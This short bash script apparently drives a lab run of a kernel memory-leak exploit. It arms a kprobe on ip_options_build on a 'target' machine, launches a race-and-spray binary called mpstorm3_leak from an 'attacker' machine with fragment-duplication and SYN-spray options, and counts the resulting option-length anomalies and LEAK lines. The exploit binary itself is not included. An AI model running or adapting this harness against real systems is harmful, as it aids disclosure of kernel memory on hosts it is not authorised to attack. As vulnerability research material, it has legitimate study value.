#!/bin/bash
# run_leak.sh <race_sport> <spray_sport> <token> [runtime] [spacing]
set -u
LAB=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
cd "$LAB"
RACE=${1:?}; SPRAY=${2:?}; TOK=${3:?}; RUNTIME=${4:-180}; SPACING=${5:-120}
./lab/ssh.sh target 'sudo sh -c "echo 0 > /sys/kernel/debug/tracing/tracing_on; echo 0 > /sys/kernel/debug/tracing/events/kprobes/enable 2>/dev/null; echo > /sys/kernel/debug/tracing/kprobe_events; echo \"p:rdopt2 ip_options_build skb=%di:x64 opt=%si:x64 optlen=+8(%si):u8\" >> /sys/kernel/debug/tracing/kprobe_events; echo \"optlen > 60\" > /sys/kernel/debug/tracing/events/kprobes/rdopt2/filter; echo 1 > /sys/kernel/debug/tracing/events/kprobes/enable; echo > /sys/kernel/debug/tracing/trace; echo 1 > /sys/kernel/debug/tracing/tracing_on; echo ARMED"'
./lab/ssh.sh attacker "timeout $((RUNTIME+30)) sudo FRAG_DUPS=1 SAVED_SYN_SPRAY=1 LEAK_DUMP=1 SPRAY_DPORT=9801 SPRAY_SRC=126.0.2.69 /tmp/mpstorm3_leak 9800 $TOK $RACE $RUNTIME $SPACING 1 $SPRAY 100 192.168.89.1 30000000 192.168.89.2 > /tmp/leak.out 2>&1; echo DONE=\$?"
./lab/ssh.sh target 'sudo sh -c "echo 0 > /sys/kernel/debug/tracing/tracing_on; echo -n 126=; grep -c optlen=126 /sys/kernel/debug/tracing/trace; grep optlen=126 /sys/kernel/debug/tracing/trace | head -3"'
./lab/ssh.sh attacker 'echo -n LEAK=; grep -c LEAK /tmp/leak.out; grep LEAK /tmp/leak.out | tail -6; tail -2 /tmp/leak.out'
